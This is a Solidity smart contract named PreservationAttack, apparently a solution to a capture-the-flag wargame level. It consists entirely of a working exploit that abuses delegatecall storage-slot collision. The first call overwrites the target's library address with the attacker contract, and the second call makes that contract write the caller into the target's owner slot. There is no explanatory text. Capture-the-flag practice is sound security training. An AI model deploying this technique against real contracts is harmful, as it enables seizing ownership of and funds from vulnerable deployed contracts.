// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPreservation.sol";

contract PreservationAttack {
    address private slot0;
    address private slot1;
    uint256 private slot2;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));

        require(address(this) == target.timeZone1Library(), "Preservation: Wrong address");

        target.setFirstTime(uint256(uint160(msg.sender)));

        require(msg.sender == target.owner(), "Preservation: Attack failed");
    }

    function setTime(uint256 _time) public {
        slot2 = _time;
    }
}
